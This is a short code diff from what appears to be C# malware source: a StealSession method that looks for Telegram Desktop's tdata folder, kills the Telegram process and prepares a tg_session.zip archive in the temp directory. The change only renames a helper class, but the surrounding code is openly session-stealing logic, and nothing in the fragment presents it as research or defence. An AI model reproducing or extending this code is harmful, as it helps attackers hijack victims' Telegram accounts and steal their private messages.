@@ -8,11 +8,11 @@
         public static string usertag = Path.Combine(tdata_path, "usertag");
         public static void StealSession() // Return null if needed files or tdata doesnt exists
         {
-            if (Auxiliary_payload.IsTelegramDesktopDirectoryExists(tdata_path))
+            if (Auxiliary.IsTelegramDesktopDirectoryExists(tdata_path))
             {
                 try
                 {
-                    Auxiliary_payload.KillTelegram();
+                    Auxiliary.KillTelegram();
 
                     if (File.Exists(Path.Combine(Path.GetTempPath(), "tg_session.zip")))
                         File.Delete(Path.Combine(Path.GetTempPath(), "tg_session.zip"));
